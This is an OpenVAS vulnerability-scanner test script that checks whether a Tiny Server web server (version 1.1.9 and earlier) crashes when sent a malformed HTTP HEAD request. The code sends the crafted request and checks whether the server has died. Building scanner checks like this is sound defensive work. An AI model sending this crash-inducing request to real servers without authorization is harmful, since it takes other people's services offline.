###############################################################################
# OpenVAS Vulnerability Test
#
# Tiny Server HTTP HEAD Request Remote Denial of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (C) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902820");
  script_version("2020-08-24T15:18:35+0000");
  script_bugtraq_id(52635);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2012-03-22 12:12:12 +0530 (Thu, 22 Mar 2012)");
  script_name("Tiny Server HTTP HEAD Request Remote Denial of Service Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52635");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18629");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/111024/tinyserver119-dos.txt");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("TinyServer/banner");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the
  application to crash, creating a denial-of-service condition.");

  script_tag(name:"affected", value:"Tiny Server versions 1.1.9 and prior.");

  script_tag(name:"insight", value:"The flaw is due to an error when processing HTTP HEAD requests
  and can be exploited to cause a denial of service via a specially crafted packet.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"summary", value:"The host is running Tiny Server and is prone to denial of service
  vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"exploit");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

banner = http_get_remote_headers(port:port);
if(!banner || "Server: TinyServer" >!< banner)
  exit(0);

if(http_is_dead(port:port))
  exit(0);

req = string("HEAD ", crap(100), "HTTP/1.0\r\n");
http_send_recv(port:port, data:req);
sleep(2);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);
